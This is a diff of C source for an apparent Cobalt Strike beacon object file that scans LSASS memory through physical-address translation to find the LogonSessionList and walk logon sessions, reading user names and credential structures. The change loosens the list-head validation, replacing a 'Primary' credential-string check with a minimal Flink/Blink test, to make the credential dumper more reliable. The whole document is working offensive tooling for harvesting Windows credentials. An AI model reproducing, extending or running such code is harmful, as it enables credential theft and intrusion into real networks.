@@ -5,23 +5,22 @@
 #include "defs.h"
 #include "lsass_offsets.h"
 
-BOOL IsEntryValid(HANDLE hFile, DWORD64 PAtoRead, DWORD lower32bits, int LsassPID, DWORD64 ImageStartAddress, DWORD64* FirstEntryInList)
+BOOL IsEntryValid(HANDLE hFile, DWORD64 PAtoRead, DWORD lower32bits, int LsassPID, DWORD64 ImageStartAddress)
 {
-    // Check if right side is valid
+    // Check if left side is valid
     DWORD64 FlinkVA = ReadAddressAtPhysicalAddressLocation(hFile, PAtoRead);
     if (FlinkVA > 0 && FlinkVA < ImageStartAddress)
     {
         DWORD64 tmpPA = 0;
         if (TranslateUVA2Physical(FlinkVA, &tmpPA, lower32bits, LsassPID))
         {
-            // Check Right Side is Valid
+            // Check right Side is Valid
             DWORD64 BlinkVA = ReadAddressAtPhysicalAddressLocation(hFile, PAtoRead + 0x8);
             if (BlinkVA > 0 && BlinkVA < ImageStartAddress)
             {
                 tmpPA = 0;
                 if (TranslateUVA2Physical(BlinkVA, &tmpPA, lower32bits, LsassPID))
                 {
-                    *FirstEntryInList = FlinkVA;
                     return TRUE;
                 }
             }
@@ -29,44 +28,6 @@ BOOL IsEntryValid(HANDLE hFile, DWORD64 PAtoRead, DWORD lower32bits, int LsassPI
     }
 
     return FALSE;
-}
-
-DWORD64 IsValidLogonSessionListHead(HANDLE hFile, DWORD64 BasePagePAtoSearch, DWORD lower32bits, int LsassPID, DWORD64 ImageStartAddress)
-{
-    DWORD64 PAtoRead = BasePagePAtoSearch;
-    DWORD64 FirstEntryInList = 0;
-    if (!IsEntryValid(hFile, PAtoRead, lower32bits, LsassPID, ImageStartAddress, &FirstEntryInList))
-    {
-        return 0;
-    }
-
-    // poi(lsasrv!LogonSessionList) = FirstEntryInList
-    DWORD64 credentialsStructureVPointer = FirstEntryInList + 0x108;
-    DWORD64 credentialsStructurePPointer = 0;
-    if (TranslateUVA2Physical(credentialsStructureVPointer, &credentialsStructurePPointer, lower32bits, LsassPID))
-    {
-        DWORD64 credentialsStructureVA = ReadAddressAtPhysicalAddressLocation(hFile, credentialsStructurePPointer);
-        DWORD64 credentialsStructurePA = 0;
-        if (TranslateUVA2Physical(credentialsStructureVA, &credentialsStructurePA, lower32bits, LsassPID))
-        {
-            DWORD64 primaryCredentialsStructureVA = ReadAddressAtPhysicalAddressLocation(hFile, credentialsStructurePA + 0x10);
-            DWORD64 primaryCredentialsStructurePA = 0;
-            if (TranslateUVA2Physical(primaryCredentialsStructureVA, &primaryCredentialsStructurePA, lower32bits, LsassPID))
-            {
-                unsigned char* PrimaryStringCheck = ReadMultipleBytes(hFile, 8, primaryCredentialsStructurePA + 0x28, TRUE);
-                if (memcmp(PrimaryStringCheck, "Primary", 8) == 0)
-                {
-                    DWORD64 PointerToLogonSessionList = 0;
-                    TranslateP2V(PAtoRead, &PointerToLogonSessionList);
-                    free(PrimaryStringCheck);
-                    return PointerToLogonSessionList;
-                }
-                free(PrimaryStringCheck);
-            }
-        }
-    }
-
-    return 0;
 }
 
 DWORD64 SearchForLogonSessionListHead(HANDLE hFile, DWORD64 DataSectionBase, DWORD lower32bits, DWORD LsassPID, DWORD64 ImageStartAddress, DWORD dBuildNumber)
@@ -154,13 +115,15 @@ DWORD64 SearchForLogonSessionListHead(HANDLE hFile, DWORD64 DataSectionBase, DWO
     }
 
     //
-    // Validate the obtained address with IsValidLogonSessionList
+    // Validate the obtained address; very minimal check
+    // previously checked for Primary string in credential struct, but could be NULL if no creds so false negative
     //
-    Real_LogonSessionList_Address = IsValidLogonSessionListHead(hFile, LogonSessionListPA, lower32bits, LsassPID, ImageStartAddress);
-    if (Real_LogonSessionList_Address == 0)
+    if (!IsEntryValid(hFile, LogonSessionListPA, lower32bits, LsassPID, ImageStartAddress))
     {
         BeaconFormatPrintf(&outputbuffer, "[!] Could not validate LogonSessionList!\n");
+        return 0;
     }
+    
 
     return Real_LogonSessionList_Address;
 }
@@ -187,7 +150,7 @@ BOOL DisplayLogonSessionListInformation(HANDLE hFile, DWORD64 LogonSessionListHe
             break; // Invalid address, break out of loop
         }
         BeaconFormatPrintf(&outputbuffer, "[%04d] Flink Base Address  : 0x%llx\n", i, Flink);
-
+        
 
         wchar_t* UserNameWideString = ReadUnicodeStringFromPhysical(hFile, FlinkPA + LSA_UNICODE_STRING_UserName, lower32bits, LsassPID);
         if (UserNameWideString == NULL || *UserNameWideString == L'\0')
